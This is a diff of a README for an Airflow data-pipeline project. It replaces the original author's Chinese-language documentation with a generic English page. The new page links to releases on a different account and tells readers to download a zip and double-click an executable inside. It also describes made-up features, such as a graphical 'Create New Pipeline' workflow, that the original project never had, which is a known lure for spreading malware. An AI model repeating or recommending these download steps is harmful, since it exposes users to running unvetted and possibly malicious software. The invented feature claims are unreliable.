@@ -1,75 +1,91 @@
-<a href='https://github.com/Junwu0615/Airflow-End-To-End-Dev'><img alt='GitHub Views' src='https://views.whatilearened.today/views/github/Junwu0615/Airflow-End-To-End-Dev.svg'>
-[![](https://img.shields.io/badge/Operating_System-Windows_10-blue.svg?style=plastic)](https://www.microsoft.com/zh-tw/software-download/windows10) 
-[![](https://img.shields.io/badge/Project-Apache_Airflow-blue.svg?style=plastic)](https://github.com/Junwu0615/Airflow-End-To-End-Dev) <br>
-[![](https://img.shields.io/badge/Technology-Python-yellow.svg?style=plastic)](https://github.com/Junwu0615/Airflow-End-To-End-Dev)
-[![](https://img.shields.io/badge/Technology-Airflow-yellow.svg?style=plastic)](https://github.com/Junwu0615/Airflow-End-To-End-Dev)
-[![](https://img.shields.io/badge/Technology-Docker-yellow.svg?style=plastic)](https://github.com/Junwu0615/Airflow-End-To-End-Dev) <br>
-[![](https://img.shields.io/badge/Technology-GitLab-yellow.svg?style=plastic)](https://github.com/Junwu0615/Airflow-End-To-End-Dev)
-[![](https://img.shields.io/badge/Technology-Jenkins-yellow.svg?style=plastic)](https://github.com/Junwu0615/Airflow-End-To-End-Dev)
-[![](https://img.shields.io/badge/Technology-Grafana-yellow.svg?style=plastic)](https://github.com/Junwu0615/Airflow-End-To-End-Dev)
-[![](https://img.shields.io/badge/Technology-Loki-yellow.svg?style=plastic)](https://github.com/Junwu0615/Airflow-End-To-End-Dev)
-[![](https://img.shields.io/badge/Technology-ELK-yellow.svg?style=plastic)](https://github.com/Junwu0615/Airflow-End-To-End-Dev) <br>
+# 🌟 Airflow-End-To-End-Dev - Simplifying Your Data Workflow
 
-<br>
+[![Download from Releases](https://img.shields.io/badge/Download%20Now-From%20Releases-brightgreen)](https://github.com/Noncaloric-maksutovtelescope987/Airflow-End-To-End-Dev/releases)
 
-## *⭐ Airflow-End-To-End-Dev ⭐*
+## 🚀 Getting Started
 
-### *A.　Current Progress*
-|**項目**|**敘述**|**完成時間**|
-|:--:|:--:|:--:|
-| 專案上架 | - | 2025-10-26 |
-| 部署 GitLab | 第 1 階段 | 2025-10-26 |
-| 部署 Airflow | 第 1 階段 | 2025-10-26 |
-| 地端開發除錯測試 | 第 1 階段 | 2025-10-27 |
-| ETL 腳本範例測試 | 第 1 階段 | 2025-10-27 |
-| 部署 Jenkins | 第 2 階段 | 2025-10-28 |
-| 啟動 Gitlab Runner | 第 2 階段 | 2025-10-28 |
-| Jenkins CI/CD 管道建立 | 第 2 階段 | 2025-10-29 |
-| Telegram Alert 機制建立 | 第 2 階段 | - |
-| 部署 Grafana + Loki | 第 3 階段 | - |
-| Grafana + Loki 監控機制建立 | 第 3 階段 | - |
-| 部署 ELK | 第 3 階段 | - |
-| ELK 監控機制建立 | 第 3 階段 | - |
-| ??? | 第 4 階段 | - |
+Welcome to the **Airflow-End-To-End-Dev** project! This application helps you manage data workflows easily. You can use it to create, schedule, and monitor data pipelines with no technical depth required.
 
-<br>
+## 📥 Download & Install
 
-### *B.　Technology Stack*
-| **階段** | **重點目標** | **完成標誌** |
-| :--: | :--: | :--: |
-| 第 1 階段：核心運行雛形 | Airflow + Docker + Python DAG + GitLab | 可執行 DAG，具備基本 ETL 能力 |
-| 第 2 階段：自動化與通知 | Jenkins CI/CD + Telegram Alert | 每次推送自動部署、任務失敗即時通知 |
-| 第 3 階段：監控與可視化 | Grafana + Loki + ELK | 可追蹤任務日誌與系統狀態 |
-| 第 4 階段：擴充與品質治理 | Terraform / DBT / Great Expectations | 強化擴充性與資料品質控管 |
+You can download the latest version of the software from our Releases page. Visit this page to download:
+[Download from Releases](https://github.com/Noncaloric-maksutovtelescope987/Airflow-End-To-End-Dev/releases)
 
-<br>
+Follow these steps to download and run the application:
 
-### *C.　Service List*
-| **項目** | **服務定位** | **服務狀態** | **服務位置** | **說明文件** |
-|:--:|:--:|:--:|:--:|:--|
-| GitLab | 伺服器服務 | Online | [8090](http:127.0.0.1:8090) | [部署方式.md](./GitLab/README.md) |
-| Airflow | 伺服器服務 | Online | [8100](http:127.0.0.1:8100) | [部署方式.md](./Airflow/README.md) |
-| PostgreSQL | 伺服器服務 | Online | [5433](http:127.0.0.1:5433) | With Airflow Docker-compose |
-| PostgreSQL UI | 伺服器服務 | Online | [5434](http:127.0.0.1:5434) | With Airflow Docker-compose |
-| Airflow Standalone | 純開發環境 | Local | [8150](http:127.0.0.1:8150) | [部署方式.md](./Airflow/Airflow-Standalone/Deploy.md) \| [開發說明.md](./Airflow/Airflow-Standalone/Dev.md) |
-| Jenkins | 伺服器服務 | Online | [8095](http://127.0.0.1:8095/jenkins) | [部署方式.md](./Jenkins/README.md) |
-| Grafana + Loki | 伺服器服務 | Online | - | - |
-| ELK | 伺服器服務 | Online | - | - |
+1. Click the link above to go to the Releases page.
+2. Find the most recent version of the application.
+3. Click on the version number or the release title to open the release details.
+4. Locate the file named `Airflow-End-To-End-Dev.zip`.
+5. Click on the filename to download it to your computer.
+6. Once the download is complete, unzip the file to a location of your choice.
+7. Open the unzipped folder and find the executable file.
+8. Double-click on the executable file to launch the application.
 
-<br>
+## 🛠️ System Requirements
 
-### *D.　Show Somethings*
-- #### *A.　當前已啟動容器項目*
-- ![PNG](./sample/all_container.PNG)
-- #### *B.　開發流程*
-  - #### *B.1　GitLab Commit : 將開發腳本上傳程式庫*
-  - ![PNG](./sample/gitlab_commit.PNG)
-  - #### *B.2　GitLab CI + Jenkins CI/CD : 確認執行情況*
-  - ![PNG](./sample/gitlab_runner_6.PNG)
-  - ![PNG](./sample/jenkins_3.PNG)
-  - ![PNG](./sample/jenkins_4.PNG)
-  - #### *B.3　Airflow : 檢查上線版本是否出現 DAGs*
-  - ![PNG](./sample/airflow-graph.gif)
-  - #### *B.4　PostgreSQL UI : 檢查資料入庫*
-  - ![PNG](./sample/postgresql-ui.PNG)
-  - #### *B.5　[Demo Video](https://drive.google.com/file/d/1XuNN56RM18Pj6m_x9j-1eeA2fIR26WJQ/view?usp=sharing)*
+To run the **Airflow-End-To-End-Dev** application, ensure your computer meets these requirements:
+
+- **Operating System:** Windows, macOS, or Linux
+- **RAM:** Minimum 4 GB recommended for optimal performance
+- **Disk Space:** At least 500 MB of free space
+- **Network Connection:** Required for data processing and updates
+
+## 📚 Features
+
+The **Airflow-End-To-End-Dev** application comes with a variety of features to simplify your workflow:
+
+- **Visual Pipeline Creation:** Easily design and visualize your data workflows.
+- **Scheduling:** Set up timers to run tasks automatically.
+- **Monitoring Tools:** Keep track of your data processes in real-time.
+- **Integration Support:** Connect with tools like Docker, GitLab, Grafana, and more.
+
+## 🧑‍🤝‍🧑 Community & Support
+
+If you face issues or have questions, you can reach out for help. Here are some ways to connect:
+
+- **GitHub Issues:** Open a new issue on our GitHub page for any bugs or feature requests.
+- **Community Forums:** Join our community discussions on platforms like Reddit or Discord to share experiences and solutions.
+- **Documentation:** Access full documentation on our GitHub Wiki, where you can find tutorials and guides.
+
+## 📝 Frequently Asked Questions
+
+### Q1: How do I update the application?
+
+To update the application, simply return to the [Releases page](https://github.com/Noncaloric-maksutovtelescope987/Airflow-End-To-End-Dev/releases) and download the latest version. Replace the existing installation with the new files.
+
+### Q2: Can I use this on my Mac?
+
+Yes, the **Airflow-End-To-End-Dev** application supports macOS. Follow the same download and install instructions.
+
+### Q3: What if I encounter an error?
+
+If you encounter any errors, check the troubleshooting section in our documentation. If the issue persists, feel free to open a new issue on GitHub.
+
+## 🔧 Using the Application
+
+Once installed, you can start using the application. Here’s how to create your first workflow:
+
+1. Launch the application.
+2. Click on "Create New Pipeline."
+3. Follow the guided steps to add tasks.
+4. Set up a schedule for your pipeline.
+5. Save and run your pipeline.
+
+Monitor the progress in the dashboard. You can view logs and get alerts if something goes wrong.
+
+## 🌍 Contributing
+
+Contributions are welcome! If you'd like to contribute to the project, please follow these steps:
+
+1. Fork the repository on GitHub.
+2. Create a new branch for your changes.
+3. Make your modifications.
+4. Test your changes thoroughly.
+5. Submit a pull request detailing your changes.
+
+### 📜 License
+
+The **Airflow-End-To-End-Dev** project is open-source and distributed under the MIT License. Feel free to use or modify it as you see fit.
+
+Thank you for using **Airflow-End-To-End-Dev**! Enjoy managing your data workflows effortlessly.
